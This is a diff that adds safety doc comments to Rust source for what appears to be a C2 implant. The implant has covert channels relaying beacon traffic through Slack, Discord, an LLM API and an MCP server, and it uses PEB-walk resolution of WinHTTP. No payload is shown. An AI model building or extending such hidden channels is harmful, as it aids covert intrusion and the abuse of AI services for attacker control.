@@ -41,6 +41,10 @@ use nyx_implant_core::heap::Vec;
 /// Requires `ctx.extc2_token` (the bot/webhook token) and `ctx.extc2_api_host`
 /// to be configured; returns `None` + a diagnostic marker otherwise so the
 /// beacon's fallback chain can pick another channel.
+///
+/// # Safety
+/// Delegates to `transport::post_frame`, which invokes WinHTTP function
+/// pointers resolved via PEB walk; `frame` must be a valid buffer.
 pub unsafe fn slack_send_recv(ctx: &ChannelCtx, frame: &[u8]) -> Option<Vec<u8>> {
     if ctx.extc2_token.is_empty() || ctx.extc2_api_host.is_empty() {
         nyx_implant_core::diag::diag_mark(b"ERR_CH_SLACK_NOCONF");
@@ -62,6 +66,10 @@ pub unsafe fn slack_send_recv(ctx: &ChannelCtx, frame: &[u8]) -> Option<Vec<u8>>
 /// The server endpoint `/extc2/llm` relays the frame to the real Anthropic
 /// Messages API (or whichever LLM provider the operator configured). Requires
 /// `ctx.extc2_token` (the API key) and `ctx.extc2_api_host` to be configured.
+///
+/// # Safety
+/// Delegates to `transport::post_frame`, which invokes WinHTTP function
+/// pointers resolved via PEB walk; `frame` must be a valid buffer.
 pub unsafe fn llm_send_recv(ctx: &ChannelCtx, frame: &[u8]) -> Option<Vec<u8>> {
     if ctx.extc2_token.is_empty() || ctx.extc2_api_host.is_empty() {
         nyx_implant_core::diag::diag_mark(b"ERR_CH_LLM_NOCONF");
@@ -83,6 +91,10 @@ pub unsafe fn llm_send_recv(ctx: &ChannelCtx, frame: &[u8]) -> Option<Vec<u8>> {
 /// The server endpoint `/extc2/mcp` relays the frame to the configured MCP
 /// server via `tools/call`. Requires `ctx.extc2_token` and
 /// `ctx.extc2_api_host` to be configured.
+///
+/// # Safety
+/// Delegates to `transport::post_frame`, which invokes WinHTTP function
+/// pointers resolved via PEB walk; `frame` must be a valid buffer.
 pub unsafe fn mcp_send_recv(ctx: &ChannelCtx, frame: &[u8]) -> Option<Vec<u8>> {
     if ctx.extc2_token.is_empty() || ctx.extc2_api_host.is_empty() {
         nyx_implant_core::diag::diag_mark(b"ERR_CH_MCP_NOCONF");
@@ -104,6 +116,10 @@ pub unsafe fn mcp_send_recv(ctx: &ChannelCtx, frame: &[u8]) -> Option<Vec<u8>> {
 /// The server endpoint `/extc2/discord` relays the frame to the real Discord
 /// webhook or bot API. Requires `ctx.extc2_token` (the webhook URL / bot token)
 /// and `ctx.extc2_api_host` to be configured.
+///
+/// # Safety
+/// Delegates to `transport::post_frame`, which invokes WinHTTP function
+/// pointers resolved via PEB walk; `frame` must be a valid buffer.
 pub unsafe fn discord_send_recv(ctx: &ChannelCtx, frame: &[u8]) -> Option<Vec<u8>> {
     if ctx.extc2_token.is_empty() || ctx.extc2_api_host.is_empty() {
         nyx_implant_core::diag::diag_mark(b"ERR_CH_DISCORD_NOCONF");
